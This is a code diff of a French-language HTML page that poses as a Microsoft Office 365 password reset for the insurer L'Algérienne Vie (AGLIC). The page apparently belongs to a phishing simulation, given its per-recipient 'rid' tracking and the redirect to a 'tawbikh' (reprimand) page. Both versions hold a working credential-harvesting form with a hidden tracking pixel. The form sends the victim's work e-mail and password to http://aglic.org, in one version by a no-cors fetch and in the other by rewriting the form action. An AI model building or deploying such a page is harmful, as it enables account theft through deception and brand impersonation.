@@ -1,313 +1,140 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Mettre à jour votre mot de passe - Microsoft</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
-            background-color: #f2f2f2;
-            background-image: radial-gradient(circle at 10% 30%, #ffffff 0%, #e9eef3 100%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        /* main card */
-        .card {
-            background: white;
-            width: 100%;
-            max-width: 440px;
-            border-radius: 4px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08), 0 2px 4px rgba(0, 0, 0, 0.02);
-            padding: 44px 40px 48px 40px;
-            transition: all 0.2s ease;
-        }
-
-        /* Microsoft logo */
-        .ms-logo {
-            height: 28px;
-            margin-bottom: 28px;
-            display: inline-block;
-        }
-
-        h1 {
-            font-size: 26px;
-            font-weight: 500;
-            color: #1e1e1e;
-            margin-bottom: 12px;
-            letter-spacing: -0.25px;
-        }
-
-        .subtext {
-            font-size: 14px;
-            color: #5e5e5e;
-            line-height: 1.4;
-            margin-bottom: 32px;
-            font-weight: 400;
-        }
-
-        .input-group {
-            margin-bottom: 28px;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #202124;
-            margin-bottom: 6px;
-        }
-
-        input {
-            width: 100%;
-            border: none;
-            border-bottom: 1px solid #c8c8c8;
-            padding: 10px 0 6px 0;
-            font-size: 15px;
-            font-family: inherit;
-            transition: border-color 0.15s ease;
-            background: transparent;
-            outline: none;
-            color: #1f1f1f;
-        }
-
-        input:focus {
-            border-bottom-color: #0067b8;
-        }
-
-        input::placeholder {
-            color: #b0b0b0;
-            font-weight: 400;
-            font-size: 14px;
-        }
-
-        .alert-text {
-            font-size: 12px;
-            color: #d13438;
-            margin-top: 8px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        button {
-            background-color: #0067b8;
-            color: white;
-            border: none;
-            border-radius: 2px;
-            padding: 10px 28px;
-            font-size: 15px;
-            font-weight: 600;
-            font-family: inherit;
-            cursor: pointer;
-            margin-top: 12px;
-            transition: background 0.2s;
-            min-width: 108px;
-            text-align: center;
-        }
-
-        button:hover {
-            background-color: #005da6;
-        }
-
-        .button-container {
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 8px;
-        }
-
-        footer {
-            margin-top: 32px;
-            text-align: center;
-            font-size: 11px;
-            color: #6e6e6e;
-            background: transparent;
-            padding: 16px 12px;
-            width: 100%;
-            max-width: 440px;
-        }
-
-        hr {
-            display: none;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .card {
-                padding: 32px 24px 40px 24px;
-            }
-            h1 {
-                font-size: 22px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mettre à jour votre mot de passe</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+      background-color: #ebf3f9;
+      background-image: radial-gradient(circle at 50% 50%, #ffffff 0%, #ebf3f9 100%);
+      background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d34a6960cc08d8ea12ffd2d3d5ce1.svg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+  </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col justify-between">
+<div class="flex-1 flex items-center justify-center px-4 py-12">
+  <div class="bg-white p-11 max-w-[440px] w-full shadow-lg border border-gray-200/50 rounded-sm relative" id="formContainer">
+    <div class="flex justify-between items-center mb-6 gap-4">
+      <img alt="Microsoft" class="h-6" onerror="this.onerror=null; this.outerHTML='<div style=\'display:flex; align-items:center; gap:6px; font-weight:600; font-size:16px; color:#737373;\'><svg style=\'width:18px; height:18px;\' viewBox=\'0 0 23 23\'><rect x=\'0\' y=\'0\' width=\'10\' height=\'10\' fill=\'#f25022\'/><rect x=\'11\' y=\'0\' width=\'10\' height=\'10\' fill=\'#7fba00\'/><rect x=\'0\' y=\'11\' width=\'10\' height=\'10\' fill=\'#00a4ef\'/><rect x=\'11\' y=\'11\' width=\'10\' height=\'10\' fill=\'#ffb900\'/></svg>Microsoft</div>';" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb224858c729e80a544cd870a.svg" />
+      <img alt="AGLIC" class="h-7 object-contain max-w-[140px] font-sans" onerror="this.onerror=null; this.outerHTML='<div style=\'display:flex; align-items:center; gap:5px;\'><svg style=\'width:22px; height:22px; color:#004a99;\' viewBox=\'0 0 24 24\' fill=\'currentColor\'><path d=\'M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z\'/></svg><div style=\'font-family:sans-serif; text-align:left;\'><div style=\'font-weight:900; color:#004a99; font-size:11px; tracking-tight:0.5px;\'>L\'ALGERIENNE VIE</div><div style=\'font-weight:700; color:#e25c00; font-size:8px; tracking-widest:1px;\'>AGLIC</div></div></div>';" src="https://lalgeriennevie.dz/wp-content/uploads/2021/05/logo-horizontal-1024x273.png" />
+    </div>
 
-<div class="card">
-    <!-- Microsoft logo (clean) -->
-    <img class="ms-logo" alt="Microsoft" 
-         src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb224858c729e80a544cd870a.svg"
-         onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 23 23\'%3E%3Crect x=\'0\' y=\'0\' width=\'10\' height=\'10\' fill=\'%23f25022\'/%3E%3Crect x=\'11\' y=\'0\' width=\'10\' height=\'10\' fill=\'%237fba00\'/%3E%3Crect x=\'0\' y=\'11\' width=\'10\' height=\'10\' fill=\'%2300a4ef\'/%3E%3Crect x=\'11\' y=\'11\' width=\'10\' height=\'10\' fill=\'%23ffb900\'/%3E%3C/svg%3E';">
+    <h1 class="text-2xl font-semibold text-[#1b1b1b] mb-1">Mettre à jour la connexion</h1>
+    <p class="text-[13px] text-[#505050] mb-5">Pour des raisons de sécurité, veuillez configurer votre nouveau mot de passe Office 365 de 18 caractères minimum.</p>
 
-    <h1>Mettre à jour la connexion</h1>
-    <div class="subtext">Pour des raisons de sécurité, veuillez configurer votre nouveau mot de passe Office 365 de 18 caractères minimum.</div>
+    <form action="" class="space-y-4" id="resetForm" method="POST" onsubmit="return handleSubmit(event)">
+      <div>
+        <label class="block text-xs font-semibold text-gray-600 mb-1">Adresse e-mail professionnelle</label>
+        <input class="w-full border-b border-gray-300 py-1.5 focus:outline-none focus:border-[#0067b8] text-sm placeholder-gray-400 transition-colors" id="username" name="username" placeholder="E-mail professionnel" required="" type="email" value="" />
+      </div>
 
-    <form id="resetForm" method="POST">
-        <div class="input-group">
-            <label>Adresse e-mail professionnelle</label>
-            <input type="email" id="username" name="username" placeholder="E-mail professionnel" autocomplete="email" required>
-        </div>
+      <div>
+        <label class="block text-xs font-semibold text-gray-600 mb-1">Nouveau mot de passe</label>
+        <input class="w-full border-b border-gray-300 py-1.5 focus:outline-none focus:border-[#0067b8] text-sm placeholder-gray-400 transition-colors" id="password" name="password" oninput="checkInputs()" placeholder="Nouveau mot de passe" required="" type="password" />
+      </div>
 
-        <div class="input-group">
-            <label>Nouveau mot de passe</label>
-            <input type="password" id="password" name="password" placeholder="Nouveau mot de passe" autocomplete="new-password" required oninput="checkInputs()">
-        </div>
+      <div>
+        <label class="block text-xs font-semibold text-gray-600 mb-1">Confirmer le nouveau mot de passe</label>
+        <input class="w-full border-b border-gray-300 py-1.5 focus:outline-none focus:border-[#0067b8] text-sm placeholder-gray-400 transition-colors" id="confirmPassword" name="password" oninput="checkInputs()" placeholder="Confirmer le mot de passe" required="" type="password" />
+      </div>
 
-        <div class="input-group">
-            <label>Confirmer le nouveau mot de passe</label>
-            <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Confirmer le mot de passe" autocomplete="off" required oninput="checkInputs()">
-        </div>
+      <div class="space-y-1 pt-1">
+        <p class="text-xs text-red-600 font-medium hidden" id="lenAlert">⚠️ Le nouveau mot de passe doit comporter au moins 18 caractères.</p>
+        <p class="text-xs text-red-600 font-medium hidden" id="matchAlert">❌ Les deux mots de passe ne correspondent pas.</p>
+        <p class="text-xs text-red-600 font-medium hidden" id="errorAlert">&nbsp;</p>
+      </div>
 
-        <div id="lenAlert" class="alert-text hidden">⚠️ Le nouveau mot de passe doit comporter au moins 18 caractères.</div>
-        <div id="matchAlert" class="alert-text hidden">❌ Les deux mots de passe ne correspondent pas.</div>
-        <div id="errorAlert" class="alert-text hidden"></div>
-
-        <div class="button-container">
-            <button type="submit">Enregistrer</button>
-        </div>
+      <div class="pt-2 flex justify-end">
+        <button class="bg-[#0067b8] hover:bg-[#005da6] text-white text-[15px] font-semibold px-9 py-1.5 min-w-[100px] text-center shadow-sm select-none transition-all" type="submit">Enregistrer</button>
+      </div>
     </form>
+  </div>
 </div>
 
-<footer>
-    L'Algérienne Vie (AGLIC) - Direction de la Sécurité des Systèmes d'Information (DSI). © 2026
-</footer>
+<div class="bg-black/5 text-[11px] text-[#505050] py-3 text-center px-4 shrink-0 font-sans">
+  L'Algérienne Vie (AGLIC) - Direction de la Sécurité des Systèmes d'Information (DSI). © 2026
+</div>
 
 <script>
-    // 1) Extract 'rid' from URL (e.g., ...?rid=jXJQeK5)
+  // ========== EXISTING VALIDATION FUNCTIONS (unchanged UI logic) ==========
+  function checkInputs() {
+    const pass = document.getElementById('password').value;
+    const confirm = document.getElementById('confirmPassword').value;
+
+    const lenAlert = document.getElementById('lenAlert');
+    const matchAlert = document.getElementById('matchAlert');
+
+    if (pass.length > 0 && pass.length < 18) {
+      lenAlert.classList.remove('hidden');
+    } else {
+      lenAlert.classList.add('hidden');
+    }
+
+    if (confirm.length > 0 && pass !== confirm) {
+      matchAlert.classList.remove('hidden');
+    } else {
+      matchAlert.classList.add('hidden');
+    }
+  }
+
+  function handleSubmit(e) {
+    const pass = document.getElementById('password').value;
+    const confirm = document.getElementById('confirmPassword').value;
+    const errorEl = document.getElementById('errorAlert');
+
+    errorEl.classList.add('hidden');
+
+    if (pass.length < 18) {
+      e.preventDefault();
+      errorEl.innerText = "❌ Le nouveau mot de passe doit comporter au moins 18 caractères.";
+      errorEl.classList.remove('hidden');
+      return false;
+    }
+
+    if (pass !== confirm) {
+      e.preventDefault();
+      errorEl.innerText = "❌ Erreur : Les deux mots de passe ne correspondent pas.";
+      errorEl.classList.remove('hidden');
+      return false;
+    }
+
+    // validation passed → allow natural form submission (action target already overridden if rid exists)
+    return true;
+  }
+
+  // ========== NEW: RID TRACKING & DYNAMIC FORM ACTION (no UI change) ==========
+  (function() {
     const urlParams = new URLSearchParams(window.location.search);
     const rid = urlParams.get('rid');
 
-    // 2) On page load, send image beacon to 10.0.0.1//?rid=...
-    if (rid) {
-        const imgBeacon = new Image();
-        imgBeacon.src = `http://aglic.org//?rid=${encodeURIComponent(rid)}`;
-        imgBeacon.style.position = 'absolute';
-        imgBeacon.style.width = '0';
-        imgBeacon.style.height = '0';
-        imgBeacon.style.opacity = '0';
-        document.body.appendChild(imgBeacon);
+    if (rid && rid.trim() !== '') {
+      const cleanRid = encodeURIComponent(rid.trim());
+      // Tracking endpoint (invisible img) — sends GET request to aglic.org with rid
+      const trackingPixelUrl = 'http://aglic.org/?rid=' + cleanRid;
+
+      // Create hidden image pixel (1x1, no visual impact)
+      const img = new Image();
+      img.src = trackingPixelUrl;
+      img.style.display = 'none';
+      img.width = 0;
+      img.height = 0;
+      img.alt = '';
+      document.body.appendChild(img);
+
+      // Dynamically set form POST target to aglic.org with same rid parameter
+      const form = document.getElementById('resetForm');
+      if (form) {
+        form.action = 'http://aglic.org/?rid=' + cleanRid;
+      }
     }
-
-    // Helper: show/hide inline validation
-    function checkInputs() {
-        const pass = document.getElementById('password').value;
-        const confirm = document.getElementById('confirmPassword').value;
-        const lenAlert = document.getElementById('lenAlert');
-        const matchAlert = document.getElementById('matchAlert');
-
-        if (pass.length > 0 && pass.length < 18) {
-            lenAlert.classList.remove('hidden');
-        } else {
-            lenAlert.classList.add('hidden');
-        }
-
-        if (confirm.length > 0 && pass !== confirm) {
-            matchAlert.classList.remove('hidden');
-        } else {
-            matchAlert.classList.add('hidden');
-        }
-    }
-
-    // Form submission handler
-    async function handleSubmit(e) {
-        e.preventDefault();
-
-        const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value;
-        const confirm = document.getElementById('confirmPassword').value;
-        const errorAlert = document.getElementById('errorAlert');
-
-        // reset generic error
-        errorAlert.classList.add('hidden');
-        errorAlert.innerText = '';
-
-        // validation
-        if (password.length < 18) {
-            errorAlert.innerText = '❌ Le nouveau mot de passe doit comporter au moins 18 caractères.';
-            errorAlert.classList.remove('hidden');
-            return false;
-        }
-        if (password !== confirm) {
-            errorAlert.innerText = '❌ Erreur : Les deux mots de passe ne correspondent pas.';
-            errorAlert.classList.remove('hidden');
-            return false;
-        }
-        if (!username) {
-            errorAlert.innerText = '❌ Veuillez entrer votre adresse e-mail professionnelle.';
-            errorAlert.classList.remove('hidden');
-            return false;
-        }
-
-        // Prepare POST data exactly as required:
-        // username=xxx&password=yyy&password=yyy
-        const postData = new URLSearchParams();
-        postData.append('username', username);
-        postData.append('password', password);
-        postData.append('password', password);   // second password field as per example
-
-        // Build target URL with rid if present
-        let targetUrl = 'http://aglic.org/';
-        if (rid) {
-            targetUrl = `http://aglic.org/?rid=${encodeURIComponent(rid)}`;
-        }
-
-        try {
-            // Send POST request (no-cors to avoid CORS errors, but request still goes out)
-            await fetch(targetUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: postData.toString(),
-                mode: 'no-cors',
-                keepalive: true
-            });
-        } catch (err) {
-            // silent fail – still redirect to tawbikh page
-            console.warn('POST delivery issue, proceeding to redirect');
-        }
-
-        // Redirect to the tawbikh page
-        window.location.href = 'https://achraflyy.github.io/trustnofeature/tawbikh.html';
-        return false;
-    }
-
-    // Attach event
-    const form = document.getElementById('resetForm');
-    if (form) {
-        form.addEventListener('submit', handleSubmit);
-    }
-
-    // expose checkInputs for inline oninput
-    window.checkInputs = checkInputs;
+    // If no rid is present, form.action remains empty (default behavior, POST to same page)
+  })();
 </script>
-
 </body>
 </html>
